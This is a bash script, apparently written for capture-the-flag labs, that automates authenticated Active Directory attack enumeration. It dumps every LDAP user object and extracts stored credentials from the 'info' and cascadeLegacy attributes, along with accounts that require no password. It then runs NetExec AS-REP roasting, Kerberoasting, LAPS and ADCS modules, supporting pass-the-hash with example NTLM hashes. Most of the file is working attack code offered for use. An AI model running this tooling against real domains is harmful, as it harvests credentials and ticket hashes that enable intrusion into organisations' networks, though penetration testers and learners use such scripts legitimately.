#!/usr/bin/env bash
# File: auth_ldap
# Author: strikoder
#
# Description:
#   Run an authenticated LDAP/LDAPS search against an Active Directory domain.
#   Dumps all user objects with selected attributes, then extracts:
#     - Users Description
#     - Users that have the "info" attribute (with context lines)
#     - Users with userAccountControl values ending in 32 (often means "Password Not Required")
#
# Usage:
#   ./auth_ldap <IP> <username> [-p <password> | -H <hash>] <domain> [ldap|ldaps]
#
# Arguments:
#   <IP>        Target Domain Controller IP or hostname
#   <username>  Account name (without domain, e.g. "ldap")
#   -p <pass>   Account password (quote if it has special chars)
#   -H <hash>   NTLM hash (for NetExec commands only)
#   <domain>    Full domain name (e.g. "support.htb")
#   [protocol]  Optional: "ldap" (default) or "ldaps"
#
# Examples:
#   ./auth_ldap 10.129.230.181 ldap -p 'P@ssw0rd!' support.htb
#   ./auth_ldap 10.129.230.181 ldap -H 'aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b' support.htb
#   ./auth_ldap 10.129.230.181 ldap -p 'P@ssw0rd!' support.htb -ldaps
#
# Output (saved in results_auth_ldap/):
#   ldap.txt          -> Full ldapsearch output (password auth only)
#   ldap_info_ctx.txt -> Context for entries with 'info:' attribute
#   ldap_pwdnotreqd.txt -> Context for userAccountControl ending in 32
#
# Notes:
#   - The script automatically converts <username> into <username>@<domain> for binding.
#   - Defaults to ldap if no protocol is given.
#   - ldapsearch only supports password authentication (no hash support)
#   - NetExec commands support both password and hash authentication
#   - All ldapsearch output and errors are shown on console via tee and also written to files.
#   - Automatically handles LDAPS certificate issues and LDAP signing requirements.

set -uo pipefail

usage() {
  echo "Usage: $0 <IP> <username> [-p <password> | -H <hash>] <domain> [-ldap|-ldaps]"
  echo "Examples:"
  echo "  $0 10.129.230.181 ldap -p 'P@ssw0rd!' support.htb"
  echo "  $0 10.129.230.181 ldap -H ':64f12cddaa88057e06a81b54e73b949b' support.htb"
  exit 1
}

if [[ $# -lt 4 ]]; then
  usage
fi

IP="$1"
USER="$2"
shift 2

# Parse password/hash
PASS=""
HASH=""
if [[ "$1" == "-p" ]]; then
  PASS="$2"
  shift 2
elif [[ "$1" == "-H" ]]; then
  HASH="$2"
  shift 2
else
  usage
fi

DOMAIN="$1"
PROTO="${2:-ldap}"

if [[ "$PROTO" == "-ldap" ]]; then
  PROTO="ldap"
elif [[ "$PROTO" == "-ldaps" ]]; then
  PROTO="ldaps"
elif [[ "$PROTO" != "ldap" && "$PROTO" != "ldaps" ]]; then
  echo "Protocol must be ldap or ldaps"
  exit 1
fi

echo "==============================================================="
echo "[*] Protocol: $PROTO (default is 'ldap', pass 'ldaps' if needed)"
echo "[*] Auth: $([ -n "$HASH" ] && echo "hash" || echo "password")"

BINDUSER="${USER}@${DOMAIN}"
BASEDN=$(echo "$DOMAIN" | awk -F. '{for(i=1;i<=NF;i++) printf "DC=%s%s",$i,(i<NF?",":""); print ""}')
URL="${PROTO}://${IP}"

OUTDIR="results_auth_ldap"
mkdir -p "$OUTDIR"

OUT_MAIN="${OUTDIR}/ldap.txt"
OUT_INFO="${OUTDIR}/ldap_info_ctx.txt"
OUT_PWDNR="${OUTDIR}/ldap_pwdnotreqd.txt"
OUT_CASCADE="${OUTDIR}/ldap_cascade_pwd.txt"

# Only run ldapsearch if using password (ldapsearch doesn't support hash auth)
if [[ -n "$PASS" ]]; then
  echo "==============================================================="
  echo "[*] Running ldapsearch on $URL with $BINDUSER ..."
  echo "==============================================================="

  # Try ldapsearch with appropriate settings based on protocol
  LDAP_SUCCESS=0

  if [[ "$PROTO" == "ldaps" ]]; then
    echo "[*] Using LDAPS with certificate bypass (LDAPTLS_REQCERT=never)"
    export LDAPTLS_REQCERT=never
    if ldapsearch -LLL -x -H "$URL" -D "$BINDUSER" -w "$PASS" -b "$BASEDN" "(objectClass=user)" > "$OUT_MAIN" 2>&1; then
      LDAP_SUCCESS=1
      cat "$OUT_MAIN"
    else
      echo "[!] LDAPS failed. Error output:"
      cat "$OUT_MAIN"
      echo "[*] Attempting fallback to LDAP..."
      PROTO="ldap"
      URL="ldap://${IP}"
    fi
  fi

  if [[ "$PROTO" == "ldap" && $LDAP_SUCCESS -eq 0 ]]; then
    echo "[*] Trying LDAP (plain)..."
    if ldapsearch -LLL -x -H "$URL" -D "$BINDUSER" -w "$PASS" -b "$BASEDN" "(objectClass=user)" > "$OUT_MAIN" 2>&1; then
      LDAP_SUCCESS=1
      cat "$OUT_MAIN"
    else
      # Check if error is about signing requirement
      if grep -q "Strong.*authentication required" "$OUT_MAIN" 2>/dev/null; then
        echo "[!] LDAP requires signing/integrity checking."
        echo "[*] Falling back to LDAPS with certificate bypass..."
        export LDAPTLS_REQCERT=never
        URL="ldaps://${IP}"
        if ldapsearch -LLL -x -H "$URL" -D "$BINDUSER" -w "$PASS" -b "$BASEDN" "(objectClass=user)" > "$OUT_MAIN" 2>&1; then
          LDAP_SUCCESS=1
          cat "$OUT_MAIN"
        else
          echo "[!] LDAPS fallback also failed. Error output:"
          cat "$OUT_MAIN"
        fi
      else
        echo "[!] LDAP failed with unexpected error:"
        cat "$OUT_MAIN"
      fi
    fi
  fi

  if [[ $LDAP_SUCCESS -eq 0 ]]; then
    echo "==============================================================="
    echo "[!] All LDAP connection attempts failed!"
    echo "[!] Check credentials, connectivity, and server configuration."
    echo "==============================================================="
  else
    echo "==============================================================="
    echo "[*] LDAP search successful!"
    echo "==============================================================="

    echo "==============================================================="
    echo "[*] Grepping 'info:' with context (-B1 -A2)..."
    echo "==============================================================="
    grep -i -B1 -A2 '^info:' "$OUT_MAIN" | tee "$OUT_INFO" || true

    echo "==============================================================="
    echo "[*] Grepping UAC entries aka users with no password or have different than the passpolicy ending in 32 (-B1 -A2)..."
    echo "==============================================================="
    grep -E -B1 -A2 '^userAccountControl:[[:space:]]*[0-9]*32$' "$OUT_MAIN" | tee "$OUT_PWDNR" || true

    echo "==============================================================="
    echo "[*] Extracting cascadeLegacy creds -> $OUT_CASCADE"
    echo "==============================================================="
    awk 'BEGIN{IGNORECASE=1}
         /^$/ { if(u!="" && p!=""){print u ":" p}; u=""; p=""; next }
         /^sAMAccountName:[[:space:]]*/ { sub(/^sAMAccountName:[[:space:]]*/,""); u=$0 }
         /cascadeLegacy/ && /:/ { sub(/^[^:]*:[[:space:]]*/,""); p=$0 }
         END { if(u!="" && p!=""){print u ":" p} }' "$OUT_MAIN" \
    | tee "$OUT_CASCADE" || true
  fi
else
  echo "==============================================================="
  echo "[!] NOTICE: ldapsearch does not support hash authentication"
  echo "[!] Skipping ldapsearch commands (use password for full functionality)"
  echo "[!] NetExec commands below will still work with hash authentication"
  echo "==============================================================="
fi

echo "==============================================================="
echo "[*] Running NetExec commands..."
echo "==============================================================="

# Build base command
if [[ -n "$HASH" ]]; then
  BASE_CMD="nxc ldap ${IP} -u ${USER} -H ${HASH} -d ${DOMAIN}"
else
  BASE_CMD="nxc ldap ${IP} -u ${USER} -p ${PASS} -d ${DOMAIN}"
fi

# Commands with -- flags
DASH_FLAGS=(--users-export --asreproast --kerberoasting)
for flag in "${DASH_FLAGS[@]}"; do
  echo "[*] Running: ${BASE_CMD} ${flag}"
  if [[ "$flag" == "--users-export" ]]; then
    ${BASE_CMD} ${flag} ${OUTDIR}/users_export.txt || true
  elif [[ "$flag" == "--asreproast" ]]; then
    ${BASE_CMD} ${flag} ${OUTDIR}/asreprostable_users.txt || true
  elif [[ "$flag" == "--kerberoasting" ]]; then
    ${BASE_CMD} ${flag} ${OUTDIR}/kerberostable_users.txt || true
  else
    ${BASE_CMD} ${flag} || true
  fi
  echo ""
done

# Modules with -M flag
MODULES=(laps adcs)
for module in "${MODULES[@]}"; do
  echo "[*] Running: ${BASE_CMD} -M ${module}"
  ${BASE_CMD} -M ${module} || true
  echo ""
done

echo "==============================================================="
echo "[*] Done. Results saved in $OUTDIR/"
echo "==============================================================="
if [[ -n "$PASS" ]]; then
  echo "    - Full dump: $OUT_MAIN"
  echo "    - Info ctx:  $OUT_INFO"
  echo "    - UAC=...32: $OUT_PWDNR"
  echo "    - Cascade:   $OUT_CASCADE"
fi
echo "    - For full results check: $OUTDIR/"
echo ""
echo "[*] IMPORTANT NOTE:"
echo "    - ldapsearch tool does NOT support hash authentication"
echo "    - Hash authentication only works with NetExec (nxc) commands"
echo "    - For full ldapsearch functionality, use password authentication"
